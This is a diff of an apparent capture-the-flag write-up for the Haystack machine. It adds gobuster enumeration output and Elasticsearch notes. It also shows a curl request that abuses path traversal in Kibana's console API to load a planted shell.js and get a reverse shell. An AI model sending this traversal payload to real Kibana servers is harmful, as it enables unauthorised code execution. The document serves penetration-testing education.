@@ -43,6 +43,25 @@ HTTP enumeration:<br>
 Sounds like only one page with heystack image available.
 ![placeholder](https://inar1.github.io/public/images/2019-11-05/heystack-badge.png)
 {% highlight shell %}
+root@kali:~# gobuster dir -u http://10.10.10.115/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt -s '200,204,301,302,403'
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.115/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php,txt
+[+] Timeout:        10s
+===============================================================
+2019/11/05 19:40:48 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+===============================================================
+2019/11/05 21:01:59 Finished
+===============================================================
 {% endhighlight %}
 
 Port 9200 enumeration:<br>
@@ -116,8 +135,8 @@ the needle in the haystack is "key"
 {% endhighlight %}
 
 Then, go back to elasticsearch.
-
-
+<em>Elasticsearch is a search engine based on the Lucene library. It provides a distributed, multitenant-capable full-text search engine with an HTTP web interface and schema-free JSON documents.</em><br>
+<br>
 To send a query to elasticsearch, we need a parameter "q".
 {% highlight shell %}
 root@kali:~# curl http://10.10.10.115:9200/_search?q=clave
@@ -171,13 +190,13 @@ We have one interesting port 5601.
 3. "-n": display port numbers
 {% highlight shell %}
 [security@haystack ~]$ ss -4 -l -n
-Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
-udp    UNCONN     0      0      127.0.0.1:323                        *:*                  
-tcp    LISTEN     0      128            *:80                         *:*                  
-tcp    LISTEN     0      128            *:9200                       *:*                  
-tcp    LISTEN     0      128            *:22                         *:*                  
-tcp    LISTEN     0      128    127.0.0.1:5601                       *:*        
-{% endhighlight %}
+Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
+udp    UNCONN     0      0      127.0.0.1:323                        *:*
+tcp    LISTEN     0      128            *:80                         *:*
+tcp    LISTEN     0      128            *:9200                       *:*
+tcp    LISTEN     0      128            *:22                         *:*
+tcp    LISTEN     0      128    127.0.0.1:5601                       *:*
+*{% endhighlight %}
 
 To access the "127.0.0.1:5601" from our localhost, we need port forwarding.<br>
 We can find "Kibana" which is date visualization UI used with Elasticsearch.
@@ -208,12 +227,17 @@ shell.js:
 {% endhighlight %}
 
 Then, launch a netcat listener and send a get request to access to the "shell.js".<br>
-We can achieve a reverse shell.
+We can achieve a reverse shell as a user "kibana".
 {% highlight shell %}
 [security@haystack shm]$ curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../dev/shm/shell.js'
 {% endhighlight %}
 {% highlight shell %}
 
 {% endhighlihgt %}
+
+Then, try to look at the files for logstash.<br>
+{% highlight shell %}
+
+{% endhighlight %}
 
 
